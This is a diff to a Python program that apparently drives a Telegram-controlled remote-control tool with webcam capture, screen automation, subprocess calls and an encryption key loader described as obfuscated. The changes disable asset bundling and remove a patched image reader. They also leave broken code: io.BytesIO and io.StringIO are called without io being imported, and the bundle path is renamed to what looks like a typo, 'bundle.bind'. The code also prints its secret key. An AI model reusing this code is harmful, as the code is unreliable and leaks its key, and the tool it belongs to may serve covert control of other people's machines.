@@ -25,10 +25,10 @@ from telepot.namedtuple import ReplyKeyboardMarkup
 #IMAGES
 import numpy as np
 from PIL import Image
-from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, imdecode, resize, waitKey,
+from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, IMREAD_COLOR,
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn,
                  destroyAllWindows, BORDER_CONSTANT, destroyWindow, copyMakeBorder)
 
 #MERGE AUDIO&VIDEO
@@ -49,13 +49,13 @@ import inspect
 import builtins
 import functools
 import traceback
+from io import BytesIO
 import pyautogui as pg
 import subprocess as sp
 from shutil import copy2
 from datetime import datetime
 from tempfile import gettempdir
 from typing import Any, Callable
-from io import BytesIO, StringIO
 from time import monotonic, sleep
 from random import choice, randint
 from webbrowser import open as browseropen
@@ -104,7 +104,7 @@ TELEGRAM_COMMANDS_LIMIT = 100
 TELEGRAM_COMMAND_LENGHT_LIMIT = 32
 TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 KEY_PATH = resource_path("key.key")
-BUNDLE_PATH = resource_path("bundle.bin")
+BUNDLE_PATH = resource_path("bundle.bind")
 
 try:
     assets_dir = resource_path("assets")
@@ -157,7 +157,6 @@ def get_real_key(key_path): #this function MUST stay in the main to remain obfus
     return bytes(key_bytes)
 
 DATA_ENCRYPTION = exists(keyfile)
-ASSETS_PACKED = exists(bundle_file)
 if DATA_ENCRYPTION:
     FERNET_KEY = get_real_key(KEY_PATH)
     print(f"KEY: {FERNET_KEY}")
@@ -166,8 +165,9 @@ if DATA_ENCRYPTION:
         sys.exit(1)
     FERNET = SimpleFernet(FERNET_KEY, b"RCPTE")
 
+ASSETS_PACKED = False # Not implemented yet
 if ASSETS_PACKED:
-    print(f"Assets bundled, bundle path:{bundle_file}")
+    print(f"Assets bundled, bundle {bundle_file}")
     BUNDLER = Bundle(bundle_file)
     print(f"{BUNDLER.index=}")
     _real_open = builtins.open
@@ -182,37 +182,12 @@ if ASSETS_PACKED:
                 print("[PatchedOpen] Getting content from BUNDLE")
                 data = BUNDLER.get_content(key)
                 if "b" in mode:
-                    return BytesIO(data)
+                    return io.BytesIO(data)
                 else:
-                    return StringIO(data.decode())
+                    return io.StringIO(data.decode())
 
         return _real_open(file, mode, *args, **kwargs)
     builtins.open = patched_open
-
-    _original_imread = imread
-    def patched_imread(filename, flags=IMREAD_COLOR):
-        print(f"[patched_imread] opening {filename}")
-        try:
-            with open(filename, "rb") as f:
-                file_content = f.read()
-        except Exception as e:
-            print(f"[patched_imread] open failed for {filename}: {e}")
-            return _original_imread(filename, flags)
-
-        if not file_content:
-            print(f"[patched_imread] Empty content for {filename}")
-            return None
-        nparr = np.frombuffer(file_content, np.uint8)
-        img = imdecode(nparr, flags)
-
-        if img is None:
-            print(f"[patched_imread] Decode failed for {filename}")
-            return _original_imread(filename, flags)
-        return img
-    imread = patched_imread
-
-else:
-    print("Assets are NOT bundled.")
 
 if isdir(DLLS_DIR):
     print(f"DLLS Directory exists: {DLLS_DIR}")
